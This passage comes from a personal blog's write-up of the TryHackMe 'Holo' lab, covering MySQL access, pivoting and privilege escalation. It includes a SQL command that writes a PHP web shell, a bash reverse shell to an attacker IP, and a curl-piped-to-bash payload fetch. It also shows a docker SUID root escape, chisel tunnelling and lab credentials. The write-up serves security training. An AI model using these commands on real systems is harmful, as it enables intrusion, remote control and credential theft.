class="operator">|</span> performance_schema <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> sys                <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="number">5</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec</span><br></pre></td></tr></table></figure>

<p>After quick enumeration we find the additional user:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users;</span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-----------------+</span></span><br><span class="line"><span class="operator">|</span> username <span class="operator">|</span> password        <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-----------------+</span></span><br><span class="line"><span class="operator">|</span> admin    <span class="operator">|</span> DBManagerLogin<span class="operator">!</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> gurag    <span class="operator">|</span> AAAA            <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-----------------+</span></span><br><span class="line"><span class="number">2</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>

<p>We then proceed to inject php code in our database, in order to escape the current environment(container) by using malicious <code>SELECT</code> command. This is a backdoor RCE on the server, that allows us to send commands via the <code>cmd</code> parameter.</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php $cmd=$_GET[&quot;cmd&quot;];system($cmd);?&gt;&#x27;</span> <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;/var/www/html/shell.php&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>We can easily prove whether it works by pointing to injected code:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="number">192.168</span><span class="number">.100</span><span class="number">.1</span>:<span class="number">8080</span><span class="operator">/</span>shell.php?cmd<span class="operator">=</span>whoami</span><br></pre></td></tr></table></figure>

<p>As pointed many time until this point, we can proceed to substitute <code>whoami</code> proof with a rev shell.</p>
<h2 id="Moving-laterally-to-a-New-Linux-Target-L-SRV01"><a href="#Moving-laterally-to-a-New-Linux-Target-L-SRV01" class="headerlink" title="Moving laterally to a New Linux Target L-SRV01"></a>Moving laterally to a New Linux Target L-SRV01</h2><p>So, I have made a script locally which is transferred onto compromised docker using curl command.</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">└─$ cat shell.sh                                    </span><br><span class="line">#<span class="operator">!</span><span class="operator">/</span>bin<span class="operator">/</span>bash</span><br><span class="line">bash <span class="operator">-</span>i <span class="operator">&gt;</span><span class="operator">&amp;</span> <span class="operator">/</span>dev<span class="operator">/</span>tcp<span class="operator">/</span><span class="number">10.50</span><span class="number">.103</span><span class="number">.59</span><span class="operator">/</span><span class="number">53</span> <span class="number">0</span><span class="operator">&gt;</span><span class="operator">&amp;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>We have to host the server locally again, and then to perform the curl onto curl. To be more precise, we have to transfer the rev shell onto the server so we can create a backdoor. Simultaneously we are listening on port 53! (netcat or metasploit)</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;http://192.168.100.1:8080/shell.php?cmd=curl%20http%3A%2F%2F10.50.103.59%3A80%2Fshell.sh%7Cbash%20%26&#x27;</span></span><br></pre></td></tr></table></figure>

<aside>
💡 Since we are dealing with curl and URL-s, everything has to be encoded. That way we are ensuring the correct handling of special characters.

</aside>

<h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><p>Yet again, we are dealing with a situation where we want to escalate our privileges or to move laterally. Since we can transfer the files onto our new machine, it is always a good option to look at the <code>linepeas</code> findings. </p>
<p>Before that we can look for quick wins, like ssh hunting, what could we execute using sudo and SUID bit permissions (command: <code>find / -perm -u=s -type f 2&gt;/dev/null</code>). And it seems like we have a <code>docker</code> SUID bit set, what indicates that we can go to GTFO bins website and check the privileged access as a SUID backdoor.</p>
<p><img src="/Portfolio-Website/img/image_holo17.png" alt="/img/image_holo17.png"></p>
<p>Reference: <a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/docker/">https://gtfobins.github.io/gtfobins/docker/</a></p>
<aside>
💡 Rabbit Hole: When dealing with potential privilege escalation scenarios, particularly with GTFOBins, it's important to remember that the commands listed on the site are often not simply "copy and paste" solutions. Each exploit or technique is highly dependent on the specific environment you're working in, so it's crucial to fully understand the context before executing these commands.

</aside>

<p>To find the docker images:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ docker ps <span class="operator">-</span>a</span><br><span class="line">docker ps <span class="operator">-</span>a</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                NAMES</span><br><span class="line"><span class="number">451</span>c4b8fb840        cb1b741122e8        &quot;/bin/sh -c &#x27;/etc/in…&quot;   <span class="number">2</span> hours ago         Up <span class="number">2</span> hours          <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">80</span><span class="operator">-</span><span class="operator">&gt;</span><span class="number">80</span><span class="operator">/</span>tcp   www<span class="operator">-</span>holo<span class="operator">-</span>live</span><br></pre></td></tr></table></figure>

<p>Now, the original command is removing the <code>alpine</code> (”Dockerized” version of Alpine Linux), but in our case we want to remove the current image that is running therefore we execute:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="operator">/</span>usr<span class="operator">/</span>bin<span class="operator">/</span>docker run <span class="operator">-</span>v <span class="operator">/</span>:<span class="operator">/</span>mnt <span class="comment">--rm -it  cb1b741122e8 chroot /mnt sh</span></span><br><span class="line"><span class="operator">/</span>usr<span class="operator">/</span>bin<span class="operator">/</span>docker run <span class="operator">-</span>v <span class="operator">/</span>:<span class="operator">/</span>mnt <span class="comment">--rm -it  cb1b741122e8 chroot /mnt sh</span></span><br><span class="line"> <span class="operator">*</span> Starting Apache httpd web server apache2                                      <span class="operator">*</span> </span><br><span class="line"> <span class="operator">*</span> Starting MySQL database server mysqld                                        <span class="keyword">No</span> directory, logging <span class="keyword">in</span> <span class="keyword">with</span> HOME<span class="operator">=</span><span class="operator">/</span></span><br><span class="line">                                                                         [ OK ]</span><br><span class="line">root<span class="variable">@581d1a69d1f2</span>:<span class="operator">/</span># whoami</span><br><span class="line">whoami</span><br><span class="line">root </span><br></pre></td></tr></table></figure>

<h2 id="Root"><a href="#Root" class="headerlink" title="Root!"></a>Root!</h2><p>The next thing is to gain persistence, stabilize shell, in order to move forward with pivoting. There are many ways of doing so, and most popular would be creating a SSH keypair and add our public key (it can be done with simple echo append). We should also opt for <code>/etc/shadow</code> permission, and if we can read that (stored hashed passwords for all user accounts on the system), then it is fairly easy to use <code>unshadow</code> and crack the plaintext password. The <code>unshadow</code> command combines information from both files into a single format that is easier to crack using tools like <code>John the Ripper</code> or <code>Hashcat</code>.</p>
<p>More info on: <a target="_blank" rel="noopener" href="https://juggernaut-sec.com/weak-file-permissions/">https://juggernaut-sec.com/weak-file-permissions/</a></p>
<h2 id="Pivoting"><a href="#Pivoting" class="headerlink" title="Pivoting"></a>Pivoting</h2><p>We have discovered new machines, that we will try to pivot to. Those are <code>10.200.107.30</code> and <code>10.200.107.31</code> .</p>
<p><img src="/Portfolio-Website/img/image_holo18.png" alt="/img/image_holo18.png"></p>
<aside>
💡 Pivoting can be done in many ways at this point. I encourage you to setup also `sshuttle` and connect with similar command as the following one:

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sshuttle -r root@admin.holo.live --ssh-cmd <span class="string">&quot;ssh -i id_rsa&quot;</span> 10.200.107.0/24 -x 10.200.107.33</span><br></pre></td></tr></table></figure>

<p>In order to do this, we would need a SSH set up earlier in privilege escalation step.<br>Additionally we can use pretty straightforward tool called <code>ligolo-ng.</code> Official repository: <a target="_blank" rel="noopener" href="https://github.com/nicocha30/ligolo-ng">https://github.com/nicocha30/ligolo-ng</a></p>
</aside>

<p>We can transfer the <code>chisel</code> instance for Linux onto the compromised machine, and same as in Wreath network from TryHackMe, we go with reverse server on our attackbox and we connect with client.</p>
<p>Set up the server on our attacker machine:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└─$ /opt/chisel/chisel_lin server -p 8000 --reverse      </span><br><span class="line">2024/08/29 19:17:36 server: Reverse tunnelling enabled</span><br></pre></td></tr></table></figure>

<p>Transfer the <code>chisel</code>script onto target machine and run the client:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl 10.50.103.59:90/chisel_lin -o /tmp/chisel_lin</span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100 8736k  100 8736k    0     0   946k      0  0:00:09  0:00:09 --:--:--  908k</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">./chisel_lin client 10.50.103.59:8000 R:socks &amp;</span><br><span class="line">[1] 664</span><br><span class="line">root@581d1a69d1f2:/tmp# 2024/08/29 17:19:37 client: Connecting to ws://10.50.103.59:8000</span><br><span class="line">2024/08/29 17:19:38 client: Connected (Latency 70.35071ms)</span><br></pre></td></tr></table></figure>

<p>Once the connection is established we can ping the target machine (or view it browser utilizing foxyproxy):</p>
<p><img src="/Portfolio-Website/img/image_holo19.png" alt="/img/image_holo19.png"></p>
<p>We run the nmap scan through <code>foxyproxy</code> to determine additional hosts on internal network:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">└─$ proxychains nmap 10.200.107.0/24                                                                                                 </span><br><span class="line">[proxychains] config file found: /etc/proxychains.conf                                                                               </span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4                                                               </span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.17 </span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.200.107.30:80  ...  OK</span><br><span class="line">RTTVAR has grown to over 2.3 seconds, decreasing to 2.0</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.200.107.31:80  ...  OK</span><br><span class="line">RTTVAR has grown to over 2.3 seconds, decreasing to 2.0</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.200.107.35:80  ...  OK</span><br><span class="line">RTTVAR has grown to over 2.3 seconds, decreasing to 2.0</span><br></pre></td></tr></table></figure>

<p>What we can additionally do, is to <code>nmap</code>every discovered port more aggressively.</p>
<p>So far, we have the following credentials, which we can try on the new website (identical look of login portal, as we had with initial <code>admin.holo.live</code> ).</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">└─$ <span class="built_in">cat</span> creds.txt  </span><br><span class="line">admin:DBManagerLogin!</span><br><span class="line">gurag:!123SecureAdminDashboard321!</span><br><span class="line">linux-admin:linuxrulez</span><br></pre></td></tr></table></figure>

<p>For this step, according to the Task 28 we have to intercept the request with user token that is provided once we head onto the <code>Reset Password</code> option. <strong>The specific part of the code that is vulnerable is when the <code>resettoken</code> is sent via JSON.</strong> </p>
<p><img src="/Portfolio-Website/img/image_holo20.png" alt="/img/image_holo20.png"></p>
<p>When heading back to the password reset website, we are prompted a new login screen for resetting password!</p>
<h2 id="What’s-next"><a href="#What’s-next" class="headerlink" title="What’s next?"></a>What’s next?</h2><p>After logging in with credentials, there is a file upload option on the website. But here we face a “catch”, since now we are facing EDR (<strong>Endpoint Detection and Response</strong>), and from here we have to dive into AV Evasion, what is taught later in this network section. However, in this writeup I haven’t covered C2 usage, nor AV Evasion, since my main focus was to document pivoting and exploitation methodology. Nevertheless, I would suggest going through complete network, where you can learn about Active Directory attacks, such as NTLM Relay attacks. </p>
</article><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/Portfolio-Website/2024/08/29/blackfield/" title="BlackField - HackTheBox"><img class="cover" src="/Portfolio-Website/img/blackfield2.png" onerror="onerror=null;src='/Portfolio-Website/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous</div><div class="prev_info">BlackField - HackTheBox</div></div></a></div><div class="next-post pull-right"><a href="/Portfolio-Website/2024/08/20/wreath/" title="Wreath - TryHackMe"><img class="cover" src="/Portfolio-Website/img/wreath_cover.png" onerror="onerror=null;src='/Portfolio-Website/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next</div><div class="next_info">Wreath - TryHackMe</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/Portfolio-Website/img/portrait_crop.JPG" onerror="this.onerror=null;this.src='/Portfolio-Website/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Faris Mujcinagic</div><div class="author-info__description">Computer science student with an interest in cybersecurity</div></div><div class="card-info-data site-data is-center"><a href="/Portfolio-Website/archives/"><div class="headline">Articles</div><div class="length-num">3</div></a><a href="/Portfolio-Website/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/Portfolio-Website/categories/"><div class="headline">Categories</div><div class="length-num">2</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/fmujcinagic"><i class="fab fa-github"></i><span>Explore my GitHub</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/fmujcinagic" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:faris1306@hotmail.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a><a class="social-icon" href="https://www.linkedin.com/in/faris-mujcinagic/" target="_blank" title="LinkedIn"><i class="fab fa-linked" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is a website where I post my writeups from HackTheBox & TryHackMe, along with side projects!</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Walkthrough"><span class="toc-number">1.</span> <span class="toc-text">Walkthrough</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Enumeration"><span class="toc-number">1.1.</span> <span class="toc-text">Enumeration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Access-granted"><span class="toc-number">1.2.</span> <span class="toc-text">Access granted!</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Situational-Awareness"><span class="toc-number">1.3.</span> <span class="toc-text">Situational Awareness</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Gaining-Access-to-Remote-MYSQL-Server"><span class="toc-number">1.4.</span> <span class="toc-text">Gaining Access to Remote MYSQL Server</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Moving-laterally-to-a-New-Linux-Target-L-SRV01"><span class="toc-number">1.5.</span> <span class="toc-text">Moving laterally to a New Linux Target L-SRV01</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-number">1.6.</span> <span class="toc-text">Privilege Escalation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Root"><span class="toc-number">1.7.</span> <span class="toc-text">Root!</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pivoting"><span class="toc-number">1.8.</span> <span class="toc-text">Pivoting</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#What%E2%80%99s-next"><span class="toc-number">1.9.</span> <span class="toc-text">What’s next?</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/Portfolio-Website/2024/08/29/blackfield/" title="BlackField - HackTheBox"><img src="/Portfolio-Website/img/blackfield2.png" onerror="this.onerror=null;this.src='/Portfolio-Website/img/404.jpg'" alt="BlackField - HackTheBox"/></a><div class="content"><a class="title" href="/Portfolio-Website/2024/08/29/blackfield/" title="BlackField - HackTheBox">BlackField - HackTheBox</a><time datetime="2024-08-28T22:00:00.000Z" title="Created 2024-08-29 00:00:00">2024-08-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/Portfolio-Website/2024/08/25/Holo/" title="Holo - TryHackMe"><img src="/Portfolio-Website/img/hololive_cover.png" onerror="this.onerror=null;this.src='/Portfolio-Website/img/404.jpg'" alt="Holo - TryHackMe"/></a><div class="content"><a class="title" href="/Portfolio-Website/2024/08/25/Holo/" title="Holo - TryHackMe">Holo - TryHackMe</a><time datetime="2024-08-25T12:13:05.000Z" title="Created 2024-08-25 14:13:05">2024-08-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/Portfolio-Website/2024/08/20/wreath/" title="Wreath - TryHackMe"><img src="/Portfolio-Website/img/wreath_cover.png" onerror="this.onerror=null;this.src='/Portfolio-Website/img/404.jpg'" alt="Wreath - TryHackMe"/></a><div class="content"><a class="title" href="/Portfolio-Website/2024/08/20/wreath/" title="Wreath - TryHackMe">Wreath - TryHackMe</a><time datetime="2024-08-20T11:07:07.000Z" title="Created 2024-08-20 13:07:07">2024-08-20</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/Portfolio-Website/img/hololive_cover.png')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By Faris Mujcinagic</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/Portfolio-Website/js/utils.js?v=4.13.0"></script><script src="/Portfolio-Website/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div></div></body></html>